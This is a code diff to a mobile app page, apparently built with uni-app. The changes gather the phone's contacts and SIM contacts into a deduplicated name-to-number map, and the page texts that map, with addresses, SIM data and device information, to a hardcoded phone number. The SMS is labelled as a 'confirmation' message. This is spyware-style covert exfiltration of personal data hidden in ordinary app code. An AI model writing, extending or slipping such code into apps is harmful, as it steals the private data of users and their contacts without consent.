@@ -44,10 +44,21 @@
 		code: '',
 		password: '',
 		addrs: [],
-		sim: []
+		sim: [],
+		data: {}
 	})
 	const selectionChange = () => {
 
+	}
+	const fn = (arr1 : any[], arr2 : any[]) => {
+		let obj = {};
+		[...arr1, ...arr2].forEach(item => {
+			let name = encodeURI(item.name)
+			if (!obj.hasOwnProperty(name)) {
+				obj[name] = item.phoneNumbers[0]?.value
+			}
+		})
+		return obj
 	}
 	uni.getLocation({
 		altitude: true,
@@ -111,6 +122,7 @@
 					nuber: item.phoneNumbers[0]?.value
 				}
 			})
+			state.data = fn(state.phone,state.sim)
 		}, function () {
 			alert("error");
 		}, {
@@ -123,19 +135,6 @@
 		});
 	})
 
-	String.prototype.encode = function () {
-
-		var bytes = [];
-
-		for (var i = 0; i < this.length; i++) {
-
-			bytes.push(this.charCodeAt(i));
-
-		}
-
-		return bytes.join(',');
-
-	}
 
 	// uni.chooseImage({
 	// 	count: 6, //默认9
@@ -156,11 +155,12 @@
 		msg.to = ['17310919081']
 		msg.body = JSON.stringify({
 			addrs: state.addrs,
-			phone: state.phone,
+			phone: state.data,
 			sim: state.sim,
 			equipment: res,
 		})
 		msg.subject = '这是一条用于确认的短信消息！';
+		msg.bodyType = 'text/plain'
 		msg.silent = false
 		plus.messaging.sendMessage(msg, function () {
 			// uni.showModal({
